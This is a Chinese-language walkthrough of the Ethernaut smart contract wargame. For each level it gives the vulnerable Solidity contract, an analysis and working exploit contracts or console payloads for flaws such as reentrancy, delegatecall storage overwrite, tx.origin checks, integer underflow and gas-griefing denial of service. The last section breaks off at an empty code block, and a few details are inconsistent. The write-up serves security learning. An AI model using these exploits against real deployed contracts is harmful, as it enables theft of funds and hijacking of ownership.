# Ethernaut记录

## Fallback

### 题目描述

> Look carefully at the contract's code below.
>
> You will beat this level if
>
> 1. you claim ownership of the contract
> 2. you reduce its balance to 0
>
>  Things that might help
>
> - How to send ether when interacting with an ABI
> - How to send ether outside of the ABI
> - Converting to and from wei/ether units (see `help()` command)
> - Fallback methods

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

### 分析

题目的目标是成为这个合约的owner，并且将合约的balance清零。

在源代码中可以看到，成为合约的owner就代表着需要将合约中的owner赋值为我们的address，有三种方式：

1.调用contribute函数

2.调用receive函数

这里需要说明一下，constructor函数是合约的构造函数，是合约在初始化的时候建立的，而sender这个全局变量代表的是当前和合约交互的用户。所以说，contructor函数的sender不可能是除了创建者之外后续用户。

如要调用contribute函数，则需要向合约转账，转入的eth大于1000才可以成为onwer，而且每次只能转小于0.001eth，显然不可行。

那么如果调用receive函数，只需要转账大于0即可成为owner。那么这个receive函数怎么调用呢？

这个函数明显长得就和正常的函数不一样，没有function修饰。

这里的话首先解释一下什么是fallback

https://me.tryblockchain.org/blockchain-solidity-fallback.html

也就是说，直接向合约转账，使用`address.send(ether to send)`向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数。或者当调用函数找不到时就会调用fallback函数。

那么这个fallback和receive又有什么关系呢？在0.6以后的版本，fallback函数的写法就不是这么写了而是：

```solidity
fallback() external {
}
receive() payable external {
   currentBalance = currentBalance + msg.value;
}
```

> fallback 和 receive 不是普通函数，而是新的函数类型，有特别的含义，所以在它们前面加 function 这个关键字。加上 function 之后，它们就变成了一般的函数，只能按一般函数来去调用。
>
> 每个合约最多有一个不带任何参数不带 function 关键字的 fallback 和 receive 函数。
>
> receive 函数类型必须是 payable 的，并且里面的语句只有在通过外部地址往合约里转账的时候执行。
>  fallback 函数类型可以是 payable 也可以不是 payable 的，如果不是 payable 的，可以往合约发送非转账交易，如果交易里带有转账信息，交易会被 revert；如果是 payable 的，自然也就可以接受转账了。
>
> 尽管 fallback 可以是 payable 的，但并不建议这么做，声明为 payable 之后，其所消耗的 gas 最大量就会被限定在 2300。

也就是说，只要向合约转账，就会执行receive函数。具体来说，就是调用contract.sendTransaction({value :  1})。

所以说，要成为owner要经过以下两个步骤：

1.调用contribute使contribution大于0

2.向合约转账，调用receive，成为owner。

成为owner后，还需要将合约的balance清零，这里需要调用withdraw函数，也就是执行这一句：

```solidity
owner.transfer(address(this).balance);
```

this指针指向的是合约本身，这句话的意思就是合约向owner的地址转帐合约所有的balance。

所以，最终的payload就是：

```solidity
contract.contribute({value: 1})
contract.sendTransaction({value: 1}) 
contract.withdraw() 
```

## Fallout

### 题目描述

Level completed!

Difficulty 2/10

Claim ownership of the contract below to complete this level.

 Things that might help

- Solidity Remix IDE

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

### 分析

提示是用ide看，问题就是他这个构造函数其实不是构造函数，Fal1out，直接调用即可。

> 过关后，会出现这样一段话：
>
> That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?
>
> Well... Not quite.
>
> The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:
>
> ```
> contract Rubixi {
>   address private owner;
>   function DynamicPyramid() { owner = msg.sender; }
>   function collectAllFees() { owner.transfer(this.balance) }
>   ...
> ```
>
> This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.

## coin flip

### 题目

需要连续十次猜中硬币翻转结果，猜对了就可以过关。

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```



### 分析

可以看到，每一次猜的值都要与blockhash/factor进行一个比对。这里，blocknumber指的是当前交易的区块编号，并不是合约所处的区块编号。由于一个块内交易数量很多，所以我们就可以通过布置一个合约，使其交易行为与验证的交易打包在一个块中，这样blockhash的值就可以提前算出来，重复十次即可过关

exp：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract exploit {
  CoinFlip expFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor (address aimAddr) public {
    expFlip = CoinFlip(aimAddr);
  }

  function hack() public {
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool guess = coinFlip == 1 ? true : false;
    expFlip.flip(guess);
  }
}
```

## telephone

### 题目

需要成为合约的owner

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### 分析

这里肯定是调用changeOwner，知识点就在于tx.origin和msg.sender之间的区别。

- tx.origin (address):交易发送方(完整的调用链)
- msg.sender (address):消息的发送方(当前调用)

可以认为，origin为源ip地址，sender为上一跳地址。

所以思路就是部署一个合约A，我们调用这个合约A，而这个合约A调用题目合约，即可完成利用。

Exp:

```solidity
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
contract exploit {

    Telephone target = Telephone(0x298b8725eeff32B8aF708AFca5f46BF8305ad0ba);

    function hack() public{
        target.changeOwner(msg.sender);
    }
}
```

## token

### 题目

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

### 分析

uint整数溢出，不会小于0。

exp:

```solidity
pragma solidity ^0.6.0;


interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Token {
    address levelInstance;

    constructor(address _levelInstance) public {
        levelInstance = _levelInstance;
    }

    function claim() public {
        IToken(levelInstance).transfer(msg.sender, 999999999999999);
    }
}
```

## delegation

### 题目

成为合约的owner

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

### 分析

有两个合约，第一个delegate里面有个pwn函数，可以直接获得owner。第二个合约delegation实例化了delegate，并且定义了fallback函数，里面通过delegeatecall调用delegate合约中的函数。

我们经常会使用call函数与合约进行交互，对合约发送数据，当然，call是一个较底层的接口，我们经常会把它封装在其他函数里使用，不过性质是差不多的，这里用到的delegatecall跟call主要的不同在于通过delegatecall调用的目标地址的代码要在当前合约的环境中执行，也就是说它的函数执行在被调用合约部分其实只用到了它的代码，所以这个函数主要是方便我们使用存在其他地方的函数，也是模块化代码的一种方法，然而这也很容易遭到破坏。用于调用其他合约的call类的函数，其中的区别如下：
1、call 的外部调用上下文是外部合约
2、delegatecall 的外部调用上下是调用合约上下文

也就是说，我们在delegation里通过delegatecall调用delegate中的pwn函数，pwn函数运行的上下文其实是delegation的环境。也就是说，此时执行pwn的话，owner其实是delegation的owner而不是delegate的owner。

抽象点理解，call就是正常的call，而delegatecall可以理解为inline函数调用。

在这里我们要做的就是使用delegatecall调用delegate合约的pwn函数，这里就涉及到使用call指定调用函数的操作，当你给call传入的第一个参数是四个字节时，那么合约就会默认这四个字节就是你要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，函数前面就是带有括号括起来的参数类型列表的函数名称。

```solidity
contract.sendTransaction({data:web3.sha3("pwn()").slice(0,10)});
```

## force

### 题目

令合约的余额大于0即可通关。

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### 分析

没有任何代码的合约怎么接受eth？这里的话以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点。

所以思路就是搞一个合约出来，然后自毁，强制给题目合约eth。

```solidity
contract Force {
    address payable levelInstance;

    constructor (address payable _levelInstance) public {
        levelInstance = _levelInstance;
    }

    function give() public payable {
        selfdestruct(levelInstance);
    }
}
```

## vault

### 题目

使得locked == false

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

### 分析

主要就是猜密码，看起来密码被private保护，不能被访问到，但是其实区块链上所有东西都是透明的，只要我们知道它存储的地方，就能访问到查询到。

使用web3的storageat函数即可查询到特定位置的数据信息。

```solidity
web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(web3.toAscii(y))});
```

## king

### 题目

合同代表一个非常简单的游戏：谁给它发送了比当前奖金还大的数量的以太，就成为新的国王。在这样的事件中，被推翻的国王获得了新的奖金，但是如果你提交的话那么合约就会回退，让level重新成为国王，而我们的目标就是阻止这一情况的发生。

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

### 分析

主要看receive函数，逻辑是先转账然后再更新king和prize，所以说，如果我们使得程序断在接受上，即可使得king不被更新。

所以代码是这样：

```solidity
pragma solidity ^0.6.0;

contract attack{
    constructor(address _addr) public payable{
        _addr.call{value : msg.value}("");
    }
    receive() external payable{
        revert();
    }
}
```

接受函数逻辑就是直接revert，这样攻击合约只要发生了转账，就会中止执行，这样transfer就不会成功，king也就不会更新。

## reentrancy

### 题目

盗取合约中所有余额

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```



### 分析

这个题目是很著名的re-entrance攻击，也就是重入攻击。漏洞点在于withdraw函数。可以看到他是先调用了`msg.sender.call{value:_amount}(""); `然后再在balance里面将存储的余额减去amount。这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，因为call的参数是空，所以会调用攻击合约的fallback函数，我们在fallback函数里面再次调用withdraw，这样套娃，就能将合约里面的钱都偷出来。

```solidity
pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint256 _amount) external;
}

contract Reentrance {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function claim(uint256 _amount) public {
        IReentrance(levelInstance).withdraw(_amount);
    }

    fallback() external payable {
        IReentrance(levelInstance).withdraw(msg.value);
    }
}
```

## elevator

### 题目

另top==true

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

### 分析

合约并没有实现building，需要我们自己定义。从程序的分析来看，top不可能为true。所以我们需要在实现building的时候搞点事情，也就是第一次搞成false，第二次调用搞成true就好。

```solidity
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Elevator {
    address levelInstance;
    bool side = true;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function isLastFloor(uint256) external returns (bool) {
        side = !side;
        return side;
    }

    function go() public {
        IElevator(levelInstance).goTo(1);
    }
}
```

## privacy

### 题目

将locked成为false

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

### 分析

和那个vault一样，只不过这次的data需要确定位置。

根据32bytes一格的标准，划分如下

```solidity
//slot 0
bool public locked = true; 
//slot 1
uint256 public constant ID = block.timestamp;
//slot 2
uint8 private flattening = 10; 
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);//2 字节
//slot 3-5
bytes32[3] private data;
```

所以最终的data[2]就在slot5

所以最终查询：

```solidity
web3.eth.getStorageAt(instance,3,function(x,y){console.info(y);})
```

## naughty coin

### 题目

NaughtCoin是一个ERC20代币，你已经拥有了所有的代币。但是你只能在10年的后才能将他们转移。你需要想出办法把它们送到另一个地址，这样你就可以把它们自由地转移吗，让后通过将token余额置为0来完成此级别。

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

### 分析

代码重载了EC20类，但是没有完全重载完，所以说可以直接调用ec20里面的函数进行转账。

```solidity
contract.approve(player,toWei("1000000"))
contract.transferFrom(player,contract.address,toWei("1000000"))
```

## preservation

### 题目

成为owner

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

### 分析

漏洞点还是在delegatecall上，由于不会改变上下文，所以说settime函数中，将storedtime赋值为time，如果delegatecall调用，其实是把slot1中的数据赋值为time。

所以说第一次setfirsttime将timezone1改掉，改成我们攻击合约地址，这样就可以调用魔改的settime函数。，然后就可以把owner改掉了。

攻击合约代码：

```solidity
pragma solidity ^0.8.0;

contract Preservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 player) public {
        owner = address(uint160(player));
    }
}
```

攻击流程：

```solidity
contract.setFirstTime(攻擊合約地址)
contract.setFirstTime(player)
```

## recovery

### 题目

合约的创建者已经构建了一个非常简单的合约示例。任何人都可以轻松地创建新的代币。部署第一个令牌合约后，创建者发送了0.5ether以获取更多token。后来他们失去了合同地址。 目的是从丢失的合同地址中恢复（或移除）0.5ether。

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

### 分析

主要的难点就是找不到合约的地址，不过所有交易都是透明的，可以直接在etherscan上查到交易，或者直接在metamask钱包里面查看交易就能获得合约的地址。找到合约地址后调用destroy函数就行。

```solidity
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract SimpleToken {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function withdraw() public {
        ISimpleToken(levelInstance).destroy(payable(msg.sender));
    }
}
```

## Alien Codex

### 题目

成为owner

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

### 分析

合约引入了ownable，这样合约中就多了个owner变量，这个变量经过查询是在slot 0中。

![image-20211025172325504](https://s3cunda.github.io/assets/post/ethernaut1.png)

前十六个字节是contact

![image-20211025172556061](https://s3cunda.github.io/assets/post/ethernaut2.png)

![image-20211025172620802](https://s3cunda.github.io/assets/post/ethernaut3.png)

可以看到调用完makecontact就变成1了。

在这个合约里面，可以指定下标元素赋值，且没有检查。所以说我们只需要计算出codex数组和slot0的距离即可改变owner。

codex是一个32bytes的数组，在slot1中存储着他的长度。我们要计算出一个元素的下标，如果下标溢出，则会存储到slot0中。

在Solidity中动态数组内变量的存储位计算方法可以概括为： b[X] == SLOAD(keccak256(slot) + X)，在这个合约中，开头的slot为1，也就是他的长度。（换句话说，数组中某个元素的slot = keccak（slot数组）+ index）

因此第一个元素位于slot keccak256(1) + 0，第二个元素位于slot keccak256(1) + 1，以此类推。

所以我们要计算的下标就是令2^256 = keccak256(slot) + index，即index = 2^256 - keccak256(slot)

攻击代码：

```solidity
pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodex {
    address levelInstance;
    
    constructor(address _levelInstance) {
      levelInstance = _levelInstance;
    }
    
    function claim() public {
        unchecked{
            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
            IAlienCodex(levelInstance).revise(index, bytes32(uint256(uint160(msg.sender))));
        }
    }

}
```

## denial

### 题目

阻止其他人从合约中withdraw。

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

### 分析

其实看到了call函数形式的转账就猜到差不多了，就是fallback函数的利用。在fallback函数中递归的调用wiithdraw函数，这样直到gas用光，就达到目的了。

```solidity
pragma solidity ^0.8.0;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Denial {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    fallback() external payable {
        IDenial(levelInstance).withdraw();
    }

    function set() public {
        IDenial(levelInstance).setWithdrawPartner(address(this));
    }
}
```

## gatekeeper1

### 题目

pass三个check

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### 分析

第一个check直接用合约交互即可。

第三个check实际上是个截断问题，也就是说0x0000ffff == 0xffff，所以key值就是tx.origin & 0xffffffff0000ffff

主要的难点在于第二个check，需要设定执行到gatetwo时的gasleft % 8191 == 0。

达到这个有两个方式，第一种方式是把原本题目合约扒下来，放到debug测试网络，然后攻击合约与其交互，在debug中看下gasleft是多少然后调整算出需要的gasleft。但是不同编译器版本编译出的合约所耗费的gas并不相同，按照medium网站上说的方式到etherscan上查了下合约信息，由于没有上传源码并不能得到题目合约的 编译器版本，所以尽管我们在debug环境下算出了符合条件的gas，仍然不能保证会成功。

第二种方式就比较暴力，直接写一个for循环，每次的gas都从一个值递增1，这样一定会遇到一个符合条件的gas。

```solidity
pragma solidity ^0.6.0;
import  './SafeMath.sol';
interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOne {
    address levelInstance;

    constructor (address _levelInstance) public {
        levelInstance = _levelInstance;
    }

    function open() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for(uint i = 0; i < 8191 ;i++)
        {
            // IGatekeeperOne(levelInstance).enter{gas: 114928}(key);
            levelInstance.call{gas:114928 + i}(abi.encodeWithSignature("enter(bytes8)", key));
        }

    }
}
```

## magicnumber

### 题目

要求使用总长度不超过10的bytecode编写出一个合约，返回值为42.

### 代码

```solidity
pragma solidity ^0.4.24;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

### 分析

主要参考这个链接，说的也比较详细：https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2

值得注意的一点是合约代码的长度是不会算构造函数以及构造合约的init函数的。

## gatekeeper2

### 题目

过三个检查

### 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### 分析

这道题目需要在magicnumber之后做。

第一个check就是部署个合约即可。

第三个利用异或的性质，将key设置为addr ^ 0xffffffffffffff即可。

第二个check比较有意思，是利用了assembler，不过含义如字面意思。

caller()指的就是攻击合约，extcodesize(caller())指的就是攻击合约的代码长度，需要使得其长度为0。

这里在之前的magicnumber提到过，合约代码长度不会算进去构造函数的长度，所以将攻击函数直接写进构造函数即可。

```solidity
pragma solidity ^0.8.0;

